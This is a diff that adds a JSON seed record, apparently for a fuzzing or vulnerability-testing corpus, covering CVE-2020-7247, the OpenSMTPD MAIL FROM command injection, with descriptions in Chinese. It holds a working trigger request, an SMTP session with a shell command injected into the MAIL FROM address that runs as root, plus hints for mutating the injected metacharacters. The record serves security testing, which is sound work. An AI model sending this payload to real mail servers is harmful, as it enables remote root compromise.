@@ -1,0 +1,54 @@
+{
+  "avd_id": "CVE-2020-7247",
+  "scope": "seedgen",
+  "confidence": "high",
+  "title_avd": "OpenSMTPD smtp_mailaddr() MAIL FROM 远程命令执行",
+  "description_raw": "OpenSMTPD 6.6 的 smtp_mailaddr()（smtp_session.c）输入校验失败时返回值错误，本地部分非法且域名为空时会自动补域名而非报错，MAIL FROM 字段中的 shell 元字符可被以 root 执行任意命令（默认配置即可触发）。",
+  "risk_level_avd": "严重",
+  "cwe_avd": "CWE-78 (OS命令注入)",
+  "trigger": {
+    "method": {
+      "value": [
+        "MAIL FROM"
+      ],
+      "confidence": "confirmed"
+    },
+    "field": {
+      "value": "MAIL FROM 地址（shell 元字符）",
+      "confidence": "confirmed"
+    },
+    "condition": {
+      "value": "MAIL FROM 地址包含 shell 元字符（; | & $() 等）且本地部分非法",
+      "confidence": "confirmed"
+    }
+  },
+  "trigger_requests": {
+    "value": [
+      "EHLO x\r\nMAIL FROM:<;for i in 0 1 2; do read r; done; /bin/sh -c 'id' > /tmp/x;>\r\nRCPT TO:<root@localhost>\r\nDATA\r\n.\r\n"
+    ],
+    "confidence": "confirmed"
+  },
+  "mutation_hints": {
+    "value": [
+      "MAIL FROM 注入 shell 元字符 ; | & ` $() ",
+      "空域名 + 非法 local part",
+      "RCPT TO 同构测试"
+    ],
+    "confidence": "confirmed"
+  },
+  "provenance": {
+    "description_raw": "confirmed",
+    "title_avd": "confirmed",
+    "risk_level_avd": "confirmed",
+    "cwe_avd": "confirmed",
+    "trigger_method": "confirmed",
+    "trigger_field": "confirmed",
+    "trigger_condition": "confirmed",
+    "trigger_requests": "confirmed",
+    "trigger_requests_note": "Qualys 发现，默认配置，CISA KEV 收录",
+    "mutation_hints": "confirmed"
+  },
+  "unmatched_avd": false,
+  "avd_id_equivalent": null,
+  "case_id": "SMTP-022"
+}
